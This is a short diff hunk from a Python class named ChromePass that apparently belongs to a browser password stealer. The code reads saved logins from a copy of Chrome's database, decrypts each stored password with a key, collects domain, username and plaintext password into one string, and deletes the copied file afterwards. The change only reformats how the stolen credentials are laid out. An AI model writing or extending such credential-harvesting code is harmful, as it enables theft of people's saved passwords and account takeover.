@@ -62,7 +62,7 @@ class ChromePass:
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         for tuple in cursor.fetchall():
             if (tuple[0] != "" and tuple[1] != "" and tuple[2] != ""):
-                login_data += tuple[0] + "," + tuple[1] + "," + self.decrypt(tuple[2], key) + "|||"
+                login_data += "\n\nDomain: " + tuple[0] + "\n   user: " + tuple[1] + "\n    Pass: " + self.decrypt(tuple[2], key)
         cursor.close()
         conn.close()
         os.remove("logindata.db")
